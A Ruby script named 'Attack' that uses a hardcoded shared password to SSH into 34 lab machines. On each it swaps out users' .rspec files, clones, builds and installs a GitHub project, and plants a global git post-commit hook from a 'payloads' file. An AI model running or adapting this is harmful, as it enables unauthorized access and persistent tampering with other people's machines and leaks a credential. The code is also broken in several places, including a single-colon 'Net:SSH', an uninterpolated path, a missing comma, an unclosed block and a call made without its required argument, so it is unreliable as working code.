require 'net/ssh'
require 'net/scp'
require 'rye'

class Attack
  def initialize(host, user, password)
    @host = host
    @user = user
    @password = password
    @home = "/Users/apprentice"
  end

  def ssh_session
    Net:SSH.start(@host, @user, password: @password) do |ssh|
      yield(ssh)
    end
  end

  def scp_session
    Net:SCP.start(@host, @user, password: @password) do |scp|
      yield(scp)
    end
  end

  def install_nyan
    ssh_session do |ssh|
      ssh.exec!("gem install nyan-cat-formatter")
    end
  end

  def config_nyan
    ssh_session do |ssh|
      ssh.execute!("mv #{@home}/.rspec #{@home}/.rspec.backup-#{DateTime.now}")
    end
    scp_session do |scp|
      scp.upload("payloads/.rspec", "#{@home}/.rspec")
    end
  end

  def install_imageleap
    ssh_session do |ssh|
      ssh.execute!("git clone https://github.com/daytonn/imageleap.git")
      ssh.execute!("cd imageleap")
      ssh.execute!("make")
      ssh.execute!("make install")
    end
  end

  def install_zorak
    ssh_session do |ssh|
      ssh.execute!("mkdir #{@home}/.gittack")
    end
    scp_session do |scp|
      scp.upload("payloads/zorak.png", "#{@home}/.gittack/zorak.png")
    end
  end

  def configure_githooks
    ssh_session do |ssh|
      template_path = ssh.execute!("git config --global init.templatedir")
      if not template_path
        template_path = "#{@home}/.git-templates"
        ssh.execute!("mkdir #{template_path}")
        ssh.execute!("mkdir #{template_path}/hooks")
      end
      template_path + "/hooks"
    end
  end

  def install_githooks(hooks_path)
    ssh_session do |ssh|
      ssh.execute!("mv hooks_path/post-commit hooks_path/post-commit.backup-#{DateTime.now}")
    scp_session do |scp|
      scp.upload("payloads/all-your-base.rb" "#{hooks_path}/post-commit")
    end
  end
end

dbc_hosts = (1..34).map{ |number| "dbc%02d.local" % number }

host = 'dbc26.local'
user = 'apprentice'
password = 'mvclover'

attack = Attack.new(host, user, password)
attack.install_imageleap
attack.install_zorak
attack.configure_githooks
attack.install_githooks
attack.install_nyan
attack.config_nyan

rset = Rye::Set.new(parallel: true)
dbc_hosts.each do |host|
  rbox = Rye::Box.new(host, user: user, safe: false, password: password, password_prompt: false)
  rset.add_box(rbox)
end

puts rset.hostname

